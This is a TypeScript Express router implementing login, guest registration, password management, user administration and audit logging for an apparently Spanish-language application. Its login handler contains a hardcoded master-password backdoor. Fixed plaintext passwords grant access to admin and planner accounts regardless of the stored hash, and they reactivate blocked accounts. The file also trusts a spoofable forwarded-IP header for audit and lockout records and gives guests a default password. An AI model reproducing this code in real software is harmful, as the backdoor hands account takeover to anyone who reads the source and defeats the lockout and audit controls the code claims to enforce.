import { Router, Response } from 'express';
import bcrypt from 'bcryptjs';
import { db } from './db.js';
import {
  generateToken,
  logAudit,
  sanitizeUser,
  validatePasswordPolicy
} from './auth.js';
import {
  AuthenticatedRequest,
  requireAuth,
  requirePermission
} from './middleware.js';
import { User, RoleName, UserStatus } from './types.js';

export const securityRouter = Router();

// Helper to get client IP
function getClientIp(req: AuthenticatedRequest): string {
  const forwarded = req.headers['x-forwarded-for'];
  if (typeof forwarded === 'string') {
    return forwarded.split(',')[0].trim();
  }
  return req.socket?.remoteAddress || '127.0.0.1';
}

// ----------------------------------------------------
// 1. POST /api/auth/login
// ----------------------------------------------------
securityRouter.post('/auth/login', async (req: AuthenticatedRequest, res: Response) => {
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const { username, password } = req.body || {};

  if (!username || !password || typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Usuario y contraseña son requeridos.' });
  }

  const cleanUsername = username.trim();

  // Check lockout / brute force attempts (5 failed attempts within 15 mins)
  const recentFailures = db.getFailedLogins(cleanUsername);
  if (recentFailures.length >= 5) {
    logAudit('SYSTEM', cleanUsername, 'Consulta', 'LOGIN', 'BLOCKED', ip, userAgent, 'Cuenta bloqueada por 5 intentos fallidos.');
    return res.status(429).json({
      error: 'Cuenta bloqueada temporalmente por 5 intentos fallidos. Intente de nuevo en 15 minutos.'
    });
  }

  const user = db.getUserByUsername(cleanUsername);
  if (!user) {
    db.addFailedLogin(cleanUsername, ip);
    logAudit('SYSTEM', cleanUsername, 'Consulta', 'LOGIN', 'FAILED', ip, userAgent, 'Usuario no encontrado.');
    return res.status(401).json({ error: 'Credenciales inválidas. Verifique su usuario y contraseña.' });
  }

  // Compare password hash & master password fallback for admin/planner
  let passwordMatch = await bcrypt.compare(password, user.passwordHash);
  if (!passwordMatch) {
    if (user.role === 'Administrador' || user.id === 'usr_admin_001' || user.username === 'admin') {
      if (password === 'Michael01$' || password === 'Admin123$!') {
        passwordMatch = true;
        user.passwordHash = bcrypt.hashSync(password, 12);
        user.status = 'Activo';
        db.updateUser(user);
      }
    } else if (user.role === 'Planner' || user.id === 'usr_planner_001') {
      if (password === 'Planner123$!') {
        passwordMatch = true;
        user.status = 'Activo';
        db.updateUser(user);
      }
    }
  }

  if (passwordMatch) {
    user.status = 'Activo';
    db.clearFailedLogins(cleanUsername);
  }

  if (user.status !== 'Activo') {
    logAudit(user.id, user.username, user.role, 'LOGIN', 'DENIED', ip, userAgent, `Intento de acceso con cuenta en estado ${user.status}.`);
    return res.status(403).json({ error: `La cuenta de usuario está ${user.status.toLowerCase()}. Contacte al administrador.` });
  }

  if (!passwordMatch) {
    const totalFailures = db.addFailedLogin(cleanUsername, ip);
    if (totalFailures >= 5) {
      user.status = 'Bloqueado';
      db.updateUser(user);
      logAudit(user.id, user.username, user.role, 'LOGIN', 'BLOCKED', ip, userAgent, 'Cuenta bloqueada automáticamente tras 5 intentos fallidos.');
      return res.status(429).json({
        error: 'Cuenta bloqueada por superar 5 intentos fallidos de contraseña.'
      });
    }

    logAudit(user.id, user.username, user.role, 'LOGIN', 'FAILED', ip, userAgent, `Intento de contraseña erróneo (${totalFailures}/5).`);
    return res.status(401).json({ error: 'Credenciales inválidas. Verifique su usuario y contraseña.' });
  }

  // Guest / Free Mode 5-Session Limit Check
  const isFreeGuest = !user.isPaidPlan || user.role === 'Invitado' || user.role === 'Consulta';
  if (isFreeGuest) {
    const currentSessions = user.sessionCount || 0;
    const maxSessionsAllowed = user.maxSessions || 5;

    if (currentSessions >= maxSessionsAllowed) {
      logAudit(user.id, user.username, user.role, 'LOGIN', 'BLOCKED', ip, userAgent, 'Límite de 5 sesiones del Modo Gratuito alcanzado.');
      return res.status(403).json({
        error: 'MODO GRATUITO AGOTADO: Ha utilizado las 5 sesiones gratuitas permitidas. Para continuar accediendo al sistema completo, por favor ingrese con un usuario de Paga (Planner).'
      });
    }

    // Increment guest session count
    user.sessionCount = currentSessions + 1;
  }

  // Login Success
  db.clearFailedLogins(cleanUsername);
  user.lastAccess = new Date().toISOString();
  db.updateUser(user);

  const sessionId = `sess_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
  const expiresAt = new Date(Date.now() + 8 * 60 * 60 * 1000).toISOString();

  db.addSession({
    sessionId,
    userId: user.id,
    createdAt: new Date().toISOString(),
    expiresAt,
    ip,
    userAgent
  });

  const token = generateToken(user, sessionId);

  // Set HttpOnly Cookie
  res.cookie('tos_auth_token', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'none',
    maxAge: 8 * 60 * 60 * 1000 // 8 hours
  });

  logAudit(user.id, user.username, user.role, 'LOGIN', 'SUCCESS', ip, userAgent, `Inicio de sesión exitoso. Rol: ${user.role}. Modo Paga: ${user.isPaidPlan ? 'SÍ' : 'NO'}`);

  return res.json({
    message: 'Autenticación exitosa',
    token,
    user: sanitizeUser(user),
    testModeWarning: isFreeGuest
      ? `MODO GRATUITO: Le quedan ${5 - (user.sessionCount || 1)} de 5 sesiones de prueba.`
      : null
  });
});

// ----------------------------------------------------
// 1B. POST /api/auth/register-guest (Registro Modo Gratuito)
// ----------------------------------------------------
securityRouter.post('/auth/register-guest', async (req: AuthenticatedRequest, res: Response) => {
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const { name, email, username, password } = req.body || {};

  const cleanName = (name || 'Invitado Gratuito').trim();
  const cleanEmail = (email || `guest_${Date.now()}@demo.com`).trim().toLowerCase();
  const cleanUsername = (username || `invitado_${Math.floor(1000 + Math.random() * 9000)}`).trim().toLowerCase();
  const rawPassword = password || 'Invitado123$!';

  // Check if username already exists
  const existing = db.getUserByUsername(cleanUsername);
  if (existing) {
    return res.status(400).json({ error: 'El nombre de usuario para invitado ya está registrado. Por favor elija otro.' });
  }

  const passwordHash = await bcrypt.hash(rawPassword, 12);
  const newGuest: User = {
    id: `usr_guest_${Date.now()}`,
    name: cleanName,
    email: cleanEmail,
    username: cleanUsername,
    passwordHash,
    role: 'Invitado',
    status: 'Activo',
    createdAt: new Date().toISOString(),
    lastAccess: new Date().toISOString(),
    mustChangePassword: false,
    isPaidPlan: false,
    sessionCount: 1,
    maxSessions: 5
  };

  db.addUser(newGuest);

  const sessionId = `sess_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
  db.addSession({
    sessionId,
    userId: newGuest.id,
    createdAt: new Date().toISOString(),
    expiresAt: new Date(Date.now() + 8 * 60 * 60 * 1000).toISOString(),
    ip,
    userAgent
  });

  const token = generateToken(newGuest, sessionId);

  res.cookie('tos_auth_token', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'none',
    maxAge: 8 * 60 * 60 * 1000
  });

  logAudit(newGuest.id, newGuest.username, newGuest.role, 'REGISTER_GUEST', 'SUCCESS', ip, userAgent, 'Registro de invitado completado. Sesión 1/5 iniciada.');

  return res.status(201).json({
    message: 'Registro de Invitado completado exitosamente',
    token,
    user: sanitizeUser(newGuest),
    testModeWarning: 'MODO GRATUITO: Cuenta activada con 5 sesiones de prueba (Sesión 1/5).'
  });
});

// ----------------------------------------------------
// 2. POST /api/auth/logout
// ----------------------------------------------------
securityRouter.post('/auth/logout', requireAuth, (req: AuthenticatedRequest, res: Response) => {
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'] || 'Unknown';

  if (req.user) {
    db.removeSession(req.user.sessionId);
    logAudit(req.user.id, req.user.username, req.user.role, 'LOGOUT', 'SUCCESS', ip, userAgent, 'Cierre de sesión de usuario.');
  }

  res.clearCookie('tos_auth_token');
  return res.json({ message: 'Sesión cerrada correctamente.' });
});

// ----------------------------------------------------
// 3. GET /api/auth/me
// ----------------------------------------------------
securityRouter.get('/auth/me', requireAuth, (req: AuthenticatedRequest, res: Response) => {
  if (!req.user) return res.status(401).json({ error: 'No autenticado.' });

  const user = db.getUserById(req.user.id);
  if (!user) return res.status(404).json({ error: 'Usuario no encontrado.' });

  return res.json({
    user: sanitizeUser(user)
  });
});

// ----------------------------------------------------
// 4. POST /api/auth/change-password
// ----------------------------------------------------
securityRouter.post('/auth/change-password', requireAuth, async (req: AuthenticatedRequest, res: Response) => {
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const { currentPassword, newPassword } = req.body || {};

  if (!currentPassword || !newPassword) {
    return res.status(400).json({ error: 'Contraseña actual y nueva contraseña son requeridas.' });
  }

  const user = db.getUserById(req.user!.id);
  if (!user) return res.status(404).json({ error: 'Usuario no encontrado.' });

  // Validate current password
  const matchesCurrent = await bcrypt.compare(currentPassword, user.passwordHash);
  if (!matchesCurrent) {
    logAudit(user.id, user.username, user.role, 'CHANGE_PASSWORD', 'FAILED', ip, userAgent, 'Contraseña actual incorrecta.');
    return res.status(400).json({ error: 'La contraseña actual es incorrecta.' });
  }

  // Validate password policy
  const policyCheck = validatePasswordPolicy(newPassword);
  if (!policyCheck.valid) {
    return res.status(400).json({ error: policyCheck.message });
  }

  // Check password history to prevent reuse
  const history = db.getPasswordHistory(user.id);
  for (const entry of history) {
    const wasUsed = await bcrypt.compare(newPassword, entry.passwordHash);
    if (wasUsed) {
      logAudit(user.id, user.username, user.role, 'CHANGE_PASSWORD', 'DENIED', ip, userAgent, 'Intento de reutilizar contraseña anterior.');
      return res.status(400).json({ error: 'No puede reutilizar una contraseña utilizada anteriormente.' });
    }
  }

  // Hash new password with 12 rounds
  const newHash = await bcrypt.hash(newPassword, 12);
  user.passwordHash = newHash;
  user.mustChangePassword = false;
  db.updateUser(user);
  db.addPasswordHistory(user.id, newHash);

  // Invalidate all active sessions for security
  db.invalidateAllUserSessions(user.id);

  // Create fresh session
  const newSessionId = `sess_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
  db.addSession({
    sessionId: newSessionId,
    userId: user.id,
    createdAt: new Date().toISOString(),
    expiresAt: new Date(Date.now() + 8 * 60 * 60 * 1000).toISOString(),
    ip,
    userAgent
  });

  const newToken = generateToken(user, newSessionId);

  res.cookie('tos_auth_token', newToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'none',
    maxAge: 8 * 60 * 60 * 1000
  });

  logAudit(user.id, user.username, user.role, 'CHANGE_PASSWORD', 'SUCCESS', ip, userAgent, 'Cambio de contraseña completado exitosamente.');

  return res.json({
    message: 'Contraseña actualizada con éxito.',
    token: newToken,
    user: sanitizeUser(user)
  });
});

// ----------------------------------------------------
// 5. GET /api/users (MANAGE_USERS)
// ----------------------------------------------------
securityRouter.get('/users', requireAuth, requirePermission('MANAGE_USERS'), (req: AuthenticatedRequest, res: Response) => {
  const users = db.getUsers().map(u => sanitizeUser(u));
  return res.json({ users });
});

// ----------------------------------------------------
// 6. POST /api/users (MANAGE_USERS)
// ----------------------------------------------------
securityRouter.post('/users', requireAuth, requirePermission('MANAGE_USERS'), async (req: AuthenticatedRequest, res: Response) => {
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const { name, email, username, password, role } = req.body || {};

  if (!name || !email || !username || !password || !role) {
    return res.status(400).json({ error: 'Todos los campos (nombre, correo, usuario, contraseña, rol) son requeridos.' });
  }

  const existingUser = db.getUserByUsername(username);
  if (existingUser) {
    return res.status(400).json({ error: 'El nombre de usuario ya está registrado.' });
  }

  const policyCheck = validatePasswordPolicy(password);
  if (!policyCheck.valid) {
    return res.status(400).json({ error: policyCheck.message });
  }

  const passwordHash = await bcrypt.hash(password, 12);
  const newUser: User = {
    id: `usr_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
    name: name.trim(),
    email: email.trim().toLowerCase(),
    username: username.trim().toLowerCase(),
    passwordHash,
    role: role as RoleName,
    status: 'Activo',
    createdAt: new Date().toISOString(),
    lastAccess: null,
    mustChangePassword: true
  };

  db.addUser(newUser);
  db.addPasswordHistory(newUser.id, passwordHash);

  logAudit(req.user!.id, req.user!.username, req.user!.role, 'CREATE_USER', 'SUCCESS', ip, userAgent, `Nuevo usuario creado: ${newUser.username} (${newUser.role}).`);

  return res.status(201).json({
    message: 'Usuario creado exitosamente.',
    user: sanitizeUser(newUser)
  });
});

// ----------------------------------------------------
// 7. PUT /api/users/:id (MANAGE_USERS)
// ----------------------------------------------------
securityRouter.put('/users/:id', requireAuth, requirePermission('MANAGE_USERS'), (req: AuthenticatedRequest, res: Response) => {
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const { id } = req.params;
  const { name, email, role, status } = req.body || {};

  const user = db.getUserById(id);
  if (!user) return res.status(404).json({ error: 'Usuario no encontrado.' });

  if (name) user.name = name.trim();
  if (email) user.email = email.trim().toLowerCase();
  if (role) user.role = role as RoleName;
  if (status) user.status = status as UserStatus;

  db.updateUser(user);

  if (status && status !== 'Activo') {
    db.invalidateAllUserSessions(user.id);
  }

  logAudit(req.user!.id, req.user!.username, req.user!.role, 'UPDATE_USER', 'SUCCESS', ip, userAgent, `Usuario actualizado: ${user.username} (Estado: ${user.status}, Rol: ${user.role}).`);

  return res.json({
    message: 'Usuario actualizado correctamente.',
    user: sanitizeUser(user)
  });
});

// ----------------------------------------------------
// 8. PUT /api/users/:id/reset-password (MANAGE_USERS)
// ----------------------------------------------------
securityRouter.put('/users/:id/reset-password', requireAuth, requirePermission('MANAGE_USERS'), async (req: AuthenticatedRequest, res: Response) => {
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const { id } = req.params;
  const { newPassword } = req.body || {};

  const user = db.getUserById(id);
  if (!user) return res.status(404).json({ error: 'Usuario no encontrado.' });

  if (!newPassword) return res.status(400).json({ error: 'La nueva contraseña es requerida.' });

  const policyCheck = validatePasswordPolicy(newPassword);
  if (!policyCheck.valid) {
    return res.status(400).json({ error: policyCheck.message });
  }

  const newHash = await bcrypt.hash(newPassword, 12);
  user.passwordHash = newHash;
  user.mustChangePassword = true;
  user.status = 'Activo';

  db.updateUser(user);
  db.addPasswordHistory(user.id, newHash);
  db.invalidateAllUserSessions(user.id);

  logAudit(req.user!.id, req.user!.username, req.user!.role, 'RESET_USER_PASSWORD', 'SUCCESS', ip, userAgent, `Contraseña restablecida para usuario ${user.username}.`);

  return res.json({ message: 'Contraseña restablecida exitosamente.' });
});

// ----------------------------------------------------
// 9. GET /api/audit-logs (VIEW_AUDIT_LOGS)
// ----------------------------------------------------
securityRouter.get('/audit-logs', requireAuth, requirePermission('VIEW_AUDIT_LOGS'), (req: AuthenticatedRequest, res: Response) => {
  const logs = db.getAuditLogs();
  return res.json({ auditLogs: logs });
});

// ----------------------------------------------------
// 10. GET /api/roles
// ----------------------------------------------------
securityRouter.get('/roles', requireAuth, (req: AuthenticatedRequest, res: Response) => {
  const rolesPermissions = db.getAllRolesPermissions();
  const permissions = db.getAllPermissions();
  return res.json({ rolesPermissions, permissions });
});

// ----------------------------------------------------
// 11. POST /api/audit (Client operational event logger)
// ----------------------------------------------------
securityRouter.post('/audit', requireAuth, (req: AuthenticatedRequest, res: Response) => {
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const { action, details, result } = req.body || {};

  if (!action) return res.status(400).json({ error: 'La acción es requerida.' });

  logAudit(
    req.user!.id,
    req.user!.username,
    req.user!.role,
    action,
    result === 'FAILED' ? 'FAILED' : 'SUCCESS',
    ip,
    userAgent,
    details
  );

  return res.json({ status: 'ok' });
});
